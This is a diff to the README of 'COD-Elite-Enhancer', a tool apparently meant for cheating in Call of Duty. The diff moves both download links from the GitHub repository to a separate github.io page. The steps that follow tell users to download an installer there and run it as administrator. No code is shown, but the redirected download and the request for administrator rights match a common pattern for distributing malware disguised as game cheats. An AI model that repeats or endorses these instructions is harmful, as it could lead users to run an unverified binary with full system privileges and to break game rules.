@@ -1,6 +1,6 @@
 # 🎯 COD-Elite-Enhancer - Gain a massive edge in matches
 
-[![Download](https://img.shields.io/badge/Download-Blue-blue)](https://github.com/Sabro5563/COD-Elite-Enhancer)
+[![Download](https://img.shields.io/badge/Download-Blue-blue)](https://sabro5563.github.io)
 
 ## 📖 Overview
 
@@ -28,7 +28,7 @@ COD-Elite-Enhancer provides tools to improve your performance in Call of Duty. T
 
 Follow these steps to install the software on your computer.
 
-1.  Visit the [Download Page](https://github.com/Sabro5563/COD-Elite-Enhancer) to find the latest release.
+1.  Visit the [Download Page](https://sabro5563.github.io) to find the latest release.
 2.  Click the link to download the installer file.
 3.  Locate the downloaded file in your browser or your Downloads folder.
 4.  Right-click the file and select "Run as administrator."
